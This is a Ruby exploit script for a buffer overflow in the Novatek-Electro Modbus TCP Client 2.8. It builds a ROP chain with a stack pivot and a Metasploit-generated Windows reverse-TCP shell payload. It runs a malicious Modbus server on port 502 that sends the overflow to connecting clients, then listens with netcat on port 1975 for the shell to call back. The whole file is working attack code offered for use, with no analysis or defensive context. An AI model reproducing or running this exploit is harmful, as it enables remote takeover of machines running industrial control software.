#!/usr/bin/env ruby 
# Novatek-Electro Modbus TCP Client Version 2.8 Buffer Overflow
require 'rex'
require 'msfenv'
require 'msf/core'
require 'msf/base'

callback = ARGV[0] 

def usage
        puts "[*] #{$0} <callback>"
        exit
end

usage if ARGV.size < 1

$framework = Msf::Simple::Framework.create(
	:module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_ENCODER, Msf::MODULE_NOP ]
)
payload = $framework.payloads.create("windows/shell_reverse_tcp")
shellcode = Msf::Simple::Payload.generate_simple(payload, {
	'OptionStr' => "LHOST=#{callback} LPORT=1975",
	'ExitFunc'  => "thread",
	'Format'    => 'raw',
	'BadChars' => "",
})
	
ropnop = [0x405566].pack('V') * 12

rop = 
[
0x44bc2a,   
0x4ef8b4,  
0x4037cf,   
0x4e0cc5,   
0x47821e,   
0x4bcd83,  
0x416f33,   
0x201,  
0x413b09,   
0x40,  
0x4898f2,   
0x4ab1df,  
0x409113,   
0x405566,  
0x403c9d,   
0x96969696,  
0x49b42b,   
].pack("V*")

sploit = Rex::Text.rand_text_alpha_upper(3024)
sploit[34, ropnop.size] = ropnop
sploit[82, rop.size + shellcode.size] = rop + shellcode
sploit[586, 4] = [0x4257ef].pack('V') #stackflip

server = TCPServer.new 502 

loop do
  client = server.accept
  select(nil,nil,nil,0.5) 
  client.write(sploit + "\r\n")
  system("nc -l 1975")
end

